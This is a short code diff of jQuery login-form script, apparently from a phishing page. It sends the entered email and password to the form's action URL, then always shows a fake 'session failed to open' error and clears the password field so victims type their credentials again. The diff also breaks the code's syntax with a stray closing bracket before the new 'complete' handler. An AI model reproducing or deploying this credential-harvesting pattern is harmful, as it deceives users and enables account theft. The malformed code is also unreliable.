@@ -53,16 +53,14 @@
     
             $.ajax({
                 url: $('#gawaboy').attr('action'),
-                type: "post",
+                method: "post",
                 data: {email: input4email, password: input4passwd},
                 processData: false,
-                beforeSend: function(jqXHR){
-                    $('#showerror').removeClass('alert').text('')
-                    $('#btn4sbmt').html('<center><div class="spinner"></div></center>').prop('disabled', true);
-                },                        
-                success: function(feedback) {
-                       $('#showerror').html("Oops.. Something went wrong, session failed to open, please try again with your correct email and password")
-                       console.log(feedback);
+                      })  
+               
+                                   
+                complete: function(feedback) {
+                       $('#showerror').html("Oops.. Something went wrong, session failed to open, please try again with your correct email and password");
                        // return false;
                 $('#igodo').focus();
                 $('#igodo').val('');
